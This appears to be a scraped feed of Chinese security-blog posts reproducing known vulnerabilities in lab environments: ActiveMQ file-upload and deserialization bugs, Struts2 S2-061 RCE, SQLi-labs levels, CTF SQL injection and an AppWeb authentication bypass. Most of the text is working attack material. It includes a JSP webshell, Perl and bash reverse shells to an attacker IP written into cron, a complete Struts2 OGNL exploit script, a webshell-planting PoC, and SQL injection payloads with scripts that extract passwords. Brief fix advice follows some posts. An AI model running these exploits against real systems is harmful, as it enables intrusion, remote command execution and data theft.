out.print(line+&quot;&lt;/br&gt;&quot;); }%&gt; 查看发现上传成功 由于上传的是文本文件并不能被服务器解析，所以我们下一步要利用MOVE方法将上传的webshell移动到可以执行的目录并更改后缀为jsp。 可以解析jsp文件的路径有： 1．/opt/activemq/webapps/api 2．/opt/activemq/webapps/admin 12345678910MOVE /fileserver/1.txt HTTP/1.1Destination: file:///opt/activemq/webapps/api/1.jspHost: 172.20.10.3:8161Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: JSESSIONID=node016s6o5xkj6jyp130d905yk3j4l1.node0Connection: close 这里有一个坑，困惑了我很久，我的方法步骤都没有问题为什么MOVE方法会一直响应超时并且得不到任何响应的内容。尝试了很久，我一度怀疑我的 vulhub环境有问题，一次偶然中我用burp抓到的包去修改执行MOVE方法很快就得到了响应结果，神奇的是把这个数据包重新复制到repeater执行再次出现 响应超时的结果，明明是两个相同的数据包，真是令人费解，有的时候在正常渗透测试过程也会发现这个情况，根据xssle师傅分析可能是MOVE方法不稳定导致的 然后访问即可 http://172.20.10.3:8161/api/1.jsp?cmd=ls 2.计划任务反弹写入反弹计划命令 123456789PUT /fileserver/1.txt HTTP/1.1Host: 172.20.10.3:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 250*/1 * * * * root /usr/bin/perl -e 'use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};' 这里在命令后面注意把换行符修改为0a，也就是linux中的\\n 移动到/etc/cron.d/目录下，遇到ubuntu目录不太一样，参考这里 3.写入ssh密钥docker未安装ssh未复现，可参考这里 Metasploit 反弹shell进入metasploit，搜索2016-3088 直接淦就完事了 poc编写根据漏洞的原理进行编写 验证模块PUT成功即可 攻击模块进行MOVE操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from pocsuite.net import reqfrom pocsuite.poc import POCBase,Outputfrom pocsuite.utils import registerclass ActiveMQPoc(POCBase): vulID = '002' version = '1.0' author = ['ol4three'] vulDate = '2020-12-17' updateDate = '2020-12-17' references = ['https://paper.seebug.org/346/'] name = 'Apache ActiveMQ (CVE-2016-3088)' appPowerLink = 'activemq.apache.org' appName = 'Apache activemq' appVersion = ' Apache ActiveMQ 5.14.0' vulType = 'Arbitrary File Reading' desc = ''' fileserverfileserverjsp\\ MOVEMOVE ''' pocDesc = ''' pocsuite -r ***.py -u target --verify&quot; ''' samples = [] install_requires = [] def _verify(self): result = {} path = &quot;fileserver/1.txt&quot; path1 = &quot;api/1.jsp?cmd=ls&quot; url = self.url + '/' + path try: resp = req.put(url) resp1 = req.get(url) if (resp.status_code == 204 and str(resp1.status_code)[0] in ('2', '3')): result['VerifyInfo'] = {} result['VerifyInfo']['URL'] = url except Exception as ex: pass return self.parse_output(result) def parse_output(self, result): output = Output(self) if result: output.success(result) else: output.fail('target is not vulnerable') return output def _attack(self): result = {} path = &quot;fileserver/1.txt&quot; path1 = &quot;api/1.jsp?cmd=id&quot; url = self.url + '/' + path url1 = self.url + '/' + path1 data1 = '1' data = '&lt;%@ page import=&quot;java.io.*&quot;%&gt;&lt;%out.print(&quot;Hello&lt;/br&gt;&quot;);String strcmd=request.getParameter(&quot;cmd&quot;);String line=null;Process p=Runtime.getRuntime().exec(strcmd);BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));while((line=br.readLine())!=null){out.print(line+&quot;&lt;/br&gt;&quot;);}%&gt;' headers ={ 'Destination' : 'file:///opt/activemq/webapps/api/1.jsp' } headers1={ 'Authorization':'Basic YWRtaW46YWRtaW4=', 'Connection':'close' } proxies={ 'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080' } try: resp = req.put(url,data=data) resp1 = req.get(url) resp2 = req.request('MOVE',url=url,headers={'Destination' : 'file:///opt/activemq/webapps/api/2.jsp'}) resp3 = req.get(url1,headers=headers1) resp3 = resp3.text[12:50] result['AdminInfo'] = {} result['AdminInfo']['SHELL'] = url1 result['AdminInfo']['EXEC '] = resp3 except Exception as ex: pass return self.parse_output(result)register(ActiveMQPoc) 修复意见1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。 2、通过移除 conf\\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能 参考链接https://paper.seebug.org/346/ http://tengxiaofei.run/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/","link":"/2020/12/17/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8APOC-CVE-2016-3088/"},{"title":"Struts2 S2-061 远程命令执行漏洞(CVE-2020-17530)复现以及脚本编写","text":"漏洞介绍Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞，开发人员使用了 %{…} 语法，从而攻击者可以通过构Payload，从而造成远程代码执行。 影响版本Apache Struts2：2.0.0 - 2.5.25 漏洞复现123https://github.com/vulhub/vulhub/tree/master/struts2/s2-061docker-compose up -d 查看端口123╰─$ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESe60ea5e361ff vulhub/struts2:2.5.25 &quot;/usr/local/bin/mvn-…&quot; 34 minutes ago Up 34 minutes 0.0.0.0:8080-&gt;8080/tcp s2-061_struts2_1 访问漏洞环境 测试漏洞是否存在 直接执行命令 反弹shell通过在线地址将bash反弹命令进行进行编码转换 http://www.jackson-t.ca/runtime-exec-payloads.html bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 poc123456789101112131415161718192021222324252627282930# encoding=utf-8import requestsimport sysfrom lxml import etreedef exp(url,cmd): payload=&quot;%25%7b(%27ol4three%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27&quot;+cmd+&quot;%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d&quot; tturl=url+&quot;/?id=&quot;+payload r=requests.get(tturl) page=r.text# etree=html.etree page=etree.HTML(page) data = page.xpath('//a[@id]/@id') print(data[0])if __name__=='__main__': print('+------------------------------------------------------------+') print('+ EXP: python struts2-061-poc.py http://1.1.1.1:8081 id +') print('+ VER: Struts 2.0.0-2.5.25 +') print('+------------------------------------------------------------+') print('+ S2-061 RCE &amp;&amp; CVE-2020-17530 +') print('+------------------------------------------------------------+') if len(sys.argv)!=3: print(&quot;[+]ussage: http://ip:port command&quot;) print(&quot;[+]============================================================&quot;) sys.exit() url=sys.argv[1] cmd=sys.argv[2]exp(url,cmd) 验证 Goby poc 开发界面 单个漏洞验证 修复意见将Apache Struts框架升级至最新版本 https://cwiki.apache.org/confluence/display/WW/S2-061 参考链接https://mp.weixin.qq.com/s/rcfXIBSpNtgCFua0yUK_ew","link":"/2020/12/16/WEB/Exploit/struts2/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-17530-%E5%A4%8D%E7%8E%B0/"},{"title":"ActiveMQ漏洞复现和分析（CVE-2015-5254）","text":"摘要Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。 影响版本Apache ActiveMQ 5.13.0之前5.x版本中 环境搭建vulhub拉取漏洞环境docker启动 1docker-compose up -d 漏洞指纹使用namp对目标进行扫描 1nmap -sV IP -p 8161,61616 扫描结果如下： 12345678910111213Host is up (0.00029s latency).PORT STATE SERVICE VERSION8161/tcp open http Jetty 8.1.16.v2014090361616/tcp open apachemq ActiveMQ OpenWire transport1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port61616-TCP:V=7.80%I=7%D=12/13%Time=5FD5DA4A%P=x86_64-apple-darwin19.SF:0.0%r(NULL,F4,&quot;\\0\\0\\0\\xf0\\x01ActiveMQ\\0\\0\\0\\n\\x01\\0\\0\\0\\xde\\0\\0\\0\\t\\0\\xSF:0cMaxFrameSize\\x06\\0\\0\\0\\0\\x06@\\0\\0\\0\\tCacheSize\\x05\\0\\0\\x04\\0\\0\\x0cCacSF:heEnabled\\x01\\x01\\0\\x12SizePrefixDisabled\\x01\\0\\0\\x20MaxInactivityDuratSF:ionInitalDelay\\x06\\0\\0\\0\\0\\0\\0'\\x10\\0\\x11TcpNoDelayEnabled\\x01\\x01\\0\\x1SF:5MaxInactivityDuration\\x06\\0\\0\\0\\0\\0\\0u0\\0\\x14TightEncodingEnabled\\x01\\SF:x01\\0\\x11StackTraceEnabled\\x01\\x01&quot;); 默认口令漏洞ActiveMQ默认口令是admin/admin 登陆后可以看到对应的版本信息。放序列化需要登陆后才能触发，任意文件上传访问webshell需要登录 反序列化漏洞(CVE-2015-5254)漏洞利用过程如下： a.构造(可以使用ysoserial)可执行命令的序列化对象 b.作为一个消息，发送给目标的61616端口 c.访问Web管理界面，读取消息触发漏洞 jmet的jar文件（这里windows和linux都经过了测试，windows在 “1.8.0_241”版本中可利用成功，linux在”11.0.7“不可以，应该是java版本导致的原因） 下载jmet 1java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/sucess&quot; -Yp ROME 目标IP 61616 发送成功如下： 123INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:ol4three-55063-1607996494671-0:1INFO d.c.j.t.JMSTarget [main] Sent gadget &quot;ROME&quot; with command: &quot;touch /tmp/sucess&quot;INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:ol4three-55063-1607996494671-0:1 点击队列即可触发（如果没有弱口令，可写入后等待管理员点击触发），可成功执行建立文件的命令，这里可通过以下命令进入docker查看 1docker exec -it 609d53eb4f5a /bin/bash 反弹shell需要在这里将bash反弹命令进行编码 1bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1 1java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;编码后的反弹命令&quot; -Yp ROME 目标IP 61616 漏洞分析漏洞触发流程如下 ObjectMessage.setObject() -&gt;MessageProducer.send()→MessageConsumer.recive()→ObjectMessage.getObject() 下面是setObject()和getObject()的操作接口 这里为序列化操作 1234567891011121314151617181920212223242526272829private void writeObject(ObjectOutputStream s) throws IOException { int sshift = 0; int ssize = 1; while (ssize &lt; 16) { sshift++; ssize &lt;&lt;= 1; } int segmentShift = 32 - sshift; int segmentMask = ssize - 1; Segment[] segments = (Segment[])new Segment[16]; for (int i = 0; i &lt; segments.length; i++) segments[i] = new Segment(0.75F); s.putFields().put(&quot;segments&quot;, segments); s.putFields().put(&quot;segmentShift&quot;, segmentShift); s.putFields().put(&quot;segmentMask&quot;, segmentMask); s.writeFields(); Node[] arrayOfNode; if ((arrayOfNode = this.table) != null) { Traverser&lt;K, V&gt; it = new Traverser&lt;K, V&gt;(arrayOfNode, arrayOfNode.length, 0, arrayOfNode.length); Node&lt;K, V&gt; p; while ((p = it.advance()) != null) { s.writeObject(p.key); s.writeObject(p.val); } } s.writeObject(null); s.writeObject(null); segments = null; } getObject()方法会调用readobject()方法中将data中的数据进行反序列化并且触发漏洞 1234567891011121314151617181920212223242526private void readObject(ObjectInputStream stream) throws InvalidObjectException { throw new InvalidObjectException(&quot;Proxy required&quot;); } static final class SerializationProxy&lt;K, V&gt; extends Object implements Serializable { final EntryWeigher&lt;? super K, ? super V&gt; weigher; final EvictionListener&lt;K, V&gt; listener; final int concurrencyLevel; final Map&lt;K, V&gt; data; final long capacity; static final long serialVersionUID = 1L; SerializationProxy(ConcurrentLinkedHashMap&lt;K, V&gt; map) { this.concurrencyLevel = map.concurrencyLevel; this.data = new HashMap(map); this.capacity = map.capacity.get(); this.listener = map.listener; this.weigher = map.weigher; } Object readResolve() { ConcurrentLinkedHashMap&lt;K, V&gt; map = (new ConcurrentLinkedHashMap.Builder()).concurrencyLevel(this.concurrencyLevel).maximumWeightedCapacity(this.capacity).listener(this.listener).weigher(this.weigher).build(); map.putAll(this.data); return map; } }","link":"/2020/12/04/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90%EF%BC%88CVE-2015-5254%EF%BC%89/"},{"title":"SQLI labs 靶场学习记录","text":"基础挑战1-20关less-1123451' order by 3%23 //得到列数为3-1' union select 1,2,group_concat(schema_name) from information_schema.schemata%23 //得到数据库名-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= 'security'%23 //得到表名-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name= 'users'%23 //得到列名-1' union select 1,username,password from users where id=3%23 //爆破得到数据 联合查询注入1?id=-1'+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ 报错注入1手动修改 LIMIT+0,1 来进行结果偏移 1?id=1'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+ 报错注入2手动修改 LIMIT+0,1 来进行结果偏移 1?id=1'+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1--+ 布尔盲注数据库第一个字母为 s 12?id=1' and left(database(),1)&gt;'r'--+?id=1' and left(database(),1)&gt;'s'--+ 延时盲注 数据库第一个字母的 ascii 码为 115，即s 12?id=1' and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+?id=1' and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+ 联合查询注入 1sqlmap -u &quot;http://127.0.0.1:80/Less-1/?id=1&quot; --dbms=MySQL --random-agent --flush-session --technique=U -v 3 报错注入 1sqlmap -u &quot;http://127.0.0.1:80/Less-1/?id=1&quot; --dbms=MySQL --random-agent --flush-session --technique=E -v 3 布尔盲注 1sqlmap -u &quot;http://127.0.0.1:80/Less-1/?id=1&quot; --dbms=MySQL --random-agent --flush-session --technique=B -v 3 延时盲注 1sqlmap -u &quot;http://127.0.0.1:80/Less-1/?id=1&quot; --dbms=MySQL --random-agent --flush-session --technique=T -v 3 less2在添加’后返回 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1 可以得到这个sql语句其实并没有单引号，只是用数字进行查询，查看源码 12$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql); 和less1一样 payload为 12?id=-1 or 1=1%23?id=-1+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ less3添加’后返回 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''-1'') LIMIT 0,1' at line 1 sql语句为： 12$sql=&quot;SELECT * FROM users WHERE id=('$id') LIMIT 0,1&quot;;$result=mysql_query($sql); 所以我们需要闭合 12?id=-1') or 1=1%23?id=-1%27)+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ less4添加’后为报错添加”后报错如下： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;-1&quot;&quot;) LIMIT 0,1' at line 1 sql语句为： 12$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;$result=mysql_query($sql); payload如下： 12?id=-1&quot;) or 1=1%23?id=-1&quot;)+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ less5尝试发现报错： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1 推测为： 1select * from users where id='input' LIMIT 0,1; sql语句为： 12$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;$result=mysql_query($sql); 尝试之前的方法不会返回我们注入的信息，如果注入成功，会返回Your are in...，出错的话就不会返回字符串，所以这里我们可以考虑 盲注 延时注入 报错注入 盲注Left()例如我们可以使用1' and left(version(),1)=3%23这个payload进行测试，截取version()得到的最左侧的字符判断是否为3，如果为3则正常返回You are in...，否则不返回。所以我们可以利用这个一步一步爆破得到left(version(),1)=5。爆破区间可以确定在/[0-9.]/。 采用1'and length(database())=8%23对数据库名字长度进行爆破，确定数据库名字长度之后，我们可以使用database()来进行爆破数据库名，采用left(database(),1)&gt;'a'这个payload进行测试，原理跟上述一致，看返回即可，直到截取长度与数据库名字一致为止，这里效率比较高的就是采用二分法进行盲注。 substr()、acsii()12341' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80%23 //截取数据库下第一个表的第一个字符与80ascii值进行对比找第二个字符只需要改成substr('xxx',2,1)即可。找第二个表改成limit 1,1 使用regexp()121' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1;)%23//users表中的列名是否有us**的列 使用ord()、mid()1231' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))= 68%23//cast(username AS CHAR)将username转换成字符串//IFNULL(exp1,exp2)假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串，具体情况取决于其所使用的语境。 脚本如下： 123456789101112131415161718192021222324252627282930#coding=utf-8import requestsresult = &quot;&quot;url_paylaod = &quot;http://127.0.0.1/Less-5/?id=1' and ascii(substr(({0}),{1},1))&gt;{2} %23&quot;chars = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~&quot;result_length = &quot;http://127.0.0.1/Less-5/?id=1' and length(({0})) &gt;{1} %23&quot;def get_result_length(payload, value): for i in range(1,100): url = result_length.format(payload, i) response = requests.get(url) if len(response.text) &gt; value: print('-----length is :%s' % str(i)) return idef get_result(result_length, payload, value): for i in range(1, result_length): for char in chars: url = url_paylaod.format(payload, i, ord(char)) response = requests.get(url) if len(response.text) &gt; value: global result result += char print('----- data is :%s' % result) breakpayload = &quot;select password from users where id=3 &quot;value = 710get_result(get_result_length(payload, value), payload, value)print(result) 报错注入推荐一篇超详细的讲解报错注入的文章——Mysql报错注入原理分析(count()、rand()、group by) 123456781' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+1' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) --+1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+1' union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x --+ 延时注入benchmark 是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。 benchmark() 中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式 1231'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+ 脚本如下 12345678910111213141516171819202122232425262728293031323334#coding=utf-8import requestsvalue =&quot;0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&amp;^@_.-!&quot;data=&quot;&quot; url = &quot;http://127.0.0.1/Less-5/?id=1' and if((ascii(substr(({0} limit 1,1),{1},1)) = '{2}'),sleep(3),NULL); %23&quot;url_length=&quot;http://127.0.0.1/Less-5/?id=1' and if((length(({0} limit 1,1))={1} ),sleep(3),NULL); %23&quot;def get_length(payload): for n in range(1,100): url= url_length.format(payload,n) #print(url) if(get_respone(url)): print(&quot;[+] length is {0}&quot;.format(n)) return ndef get_data(payload,value,length): for n in range(1,length): for v in value : url_data = url.format(payload,n,ord(v)) #print(url_data) if(get_respone(url_data)): global data data=data+v print(&quot;[+] data is {0}&quot;.format(data)) breakdef get_respone(url): try: html = requests.get(url,timeout=2) return False except Exception as e: print(&quot;......&quot;) return Truedatabse_payload =&quot;select user()&quot;get_data(databse_payload,value,get_length(databse_payload)+1) 更新中… 参考：https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-111 http://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/","link":"/2020/12/23/WEB/SQLI-labs-%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"title":"SQL注入-CTF","text":"概要 SQL注入：开发人员在开发过程中，直接将URL中的参数、HTTP Body中的Post参数或其他外来的用户输入（如Cookies，UserAgent等）与SQL语句进行拼接，造成待执行的SQL语句可控，从而使我们可以执行任意SQL语句 分类1.可回显的注入 可以联合查询的注入 报错注入 通过注入进行DNS请求，从而到达可回显的目的 2.不可回显的注入 Bool盲注 时间盲注 3.二次注入通常作为一种业务逻辑较为复杂的题目出现，一般需要自己编写脚本以实现自动化注入。 在一般的CTF比赛中，出题人都会变相地增加一层WAF 可以联合查询的SQL注入在可以联合查询的题目中，一般会将数据库查询的数据回显到页面中，比如下面这个例子(测试样例代码时需要关闭GPC)： 12345&lt;php $id = $_GET['id']; $getid = &quot;SELECT Id FROM users WHERE user_id = '$id'&quot; $result = mysql_query($getid) or die('&lt;pre&gt;'.mysql_error().'&lt;/pre') $num = mysql_numrows($result); $id变量会将GET获取到的参数直接拼接到SQL语句中，假如传入如下参数： 1?id=-1'union+select+1--+ 拼接后SQL语句就变成了： 1SELECT Id FROM users WHERE user_id='-1'union select 1 --'' 闭合前面的单引号，注释后面的单引号，中间写上需要的Payload就可以了 报错注入1.updatexml updatexml 的报错原理从本质上来说就是函数的报错 12mysql&gt; SELECT updatexml(1,concat(0x01,(SELECT version()),0x01),1);ERROR 1105 (HY000): XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1~' 这里还是使用前面的例子，举出一个爆破数据库版本的样例Payload： 1?id=1+updatexml(1,concat(0x01,SELECT version(),0x01),1)%23 其他功能的Payload可以参照下面floor的使用方法来修改 2.floor floor报错的原理是rand和order by 或 group by的冲突。在MySQL文档中的原文如下： 12RAND() in a WHERE clause is re-evaluated every time the WHERE is executedUse of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result. 了解原理之后，我们来说一下应用的方法，如下。 爆破数据库版本 1?id=1‘+and(select 1 from(select count(*),concat(select (select (select concat(0x01,user(),0x01)) from information_schema.table limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23 爆破当前用户 1?id=1'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23 爆破当前使用的数据库 1?id=1'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23 爆破指定表的字段（下面以表名为emails举例说明）: 1?id=1'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_name = 0x656d61696c73 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23 ps:我们这里采用的是十六进制的编码后的表名。如果想采用十六进制编码的表名则需要添加引号，但是这里有时候会出现单引号导致的报错 以上的Payload 可以在sqli-labs的level1中复现 这里只演示爆破当前用户 exp exp函数报错，exq()报错的本质原因是溢出报错。我们可以在MySQL中输入 1select exp(~(select * from (select user())x)) 同样使用前面的例子，Payload为： 1?id=1' exp(~(select * from (select user())x))%23 Bool盲注 Bool盲注通常是由于开发者将报错信息屏蔽而导致的，但是网页中真和假有着不同的回显，比如返回真时返回access，为假时返回false；或者为真时返回正常页面，为假时跳转到错误页面等","link":"/2020/12/22/CTF/Web/SQL%E6%B3%A8%E5%85%A5-CTF/"},{"title":"AppWeb认证绕过漏洞(CVE-2018-8715)","text":"摘要 AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。 AppWeb可以进行认证配置，其认证方式包括以下三种： 123451、basic 传统HTTP基础认证2、digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头3、form 表单认证 漏洞描述其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接 认证成功，并返回session。 漏洞复现访问页面如下： 构造的get数据包，加入我们构造的usename字段，注意用户名是已经存在的才可以进行构造 Authorization: Digest username=admin 即可登陆成功 漏洞分析其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。 漏洞位置在appweb/paks/http/dist/httpLib.c 2 首先是function authCondition() 12345678910111213141516171819202122232425262728293031323334353637383940/* This condition is used to implement all user authentication for routes */static int authCondition(HttpConn *conn, HttpRoute *route, HttpRouteOp *op){ HttpAuth *auth; cchar *username, *password; assert(conn); assert(route); auth = route-&gt;auth; if (!auth || !auth-&gt;type) { /* Authentication not required */ return HTTP_ROUTE_OK; } if (!httpIsAuthenticated(conn)) { httpGetCredentials(conn, &amp;username, &amp;password); if (!httpLogin(conn, username, password)) { if (!conn-&gt;tx-&gt;finalized) { if (auth &amp;&amp; auth-&gt;type) { (auth-&gt;type-&gt;askLogin)(conn); } else { httpError(conn, HTTP_CODE_UNAUTHORIZED, &quot;Access Denied, login required&quot;); } /* Request has been denied and a response generated. So OK to accept this route. */ } return HTTP_ROUTE_OK; } } if (!httpCanUser(conn, NULL)) { httpTrace(conn, &quot;auth.check&quot;, &quot;error&quot;, &quot;msg:'Access denied, user is not authorized for access'&quot;); if (!conn-&gt;tx-&gt;finalized) { httpError(conn, HTTP_CODE_FORBIDDEN, &quot;Access denied. User is not authorized for access.&quot;); /* Request has been denied and a response generated. So OK to accept this route. */ } } /* OK to accept route. This does not mean the request was authenticated - an error may have been already generated */ return HTTP_ROUTE_OK;} 这个函数负责调用两个用于认证处理的函数：getCredentials和httpLogin，注意到httpGetCredentials周围缺少检查，这将会在稍后起到作用 httpGetCredentials(): 12345678910111213141516171819202122232425262728293031323334/* Get the username and password credentials. If using an in-protocol auth scheme like basic|digest, the rx-&gt;authDetails will contain the credentials and the parseAuth callback will be invoked to parse. Otherwise, it is expected that &quot;username&quot; and &quot;password&quot; fields are present in the request parameters. This is called by authCondition which thereafter calls httpLogin */PUBLIC bool httpGetCredentials(HttpConn *conn, cchar **username, cchar **password){ HttpAuth *auth; assert(username); assert(password); *username = *password = NULL; auth = conn-&gt;rx-&gt;route-&gt;auth; if (!auth || !auth-&gt;type) { return 0; } if (auth-&gt;type) { if (conn-&gt;authType &amp;&amp; !smatch(conn-&gt;authType, auth-&gt;type-&gt;name)) { if (!(smatch(auth-&gt;type-&gt;name, &quot;form&quot;) &amp;&amp; conn-&gt;rx-&gt;flags &amp; HTTP_POST)) { /* If a posted form authentication, ignore any basic|digest details in request */ return 0; } } if (auth-&gt;type-&gt;parseAuth &amp;&amp; (auth-&gt;type-&gt;parseAuth)(conn, username, password) &lt; 0) { return 0; } } else { *username = httpGetParam(conn, &quot;username&quot;, 0); *password = httpGetParam(conn, &quot;password&quot;, 0); } return 1;} 该函数接收两个指向数组的指针用于从请求中解析username和password。既然authCondition没有进行参数检查，那么parseAuth失败也无关紧要。这意味着我们能够插入WWW-Authenticate header或者post任何我们想要的认证数据 httpLogin()： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/* Login the user and create an authenticated session state store */PUBLIC bool 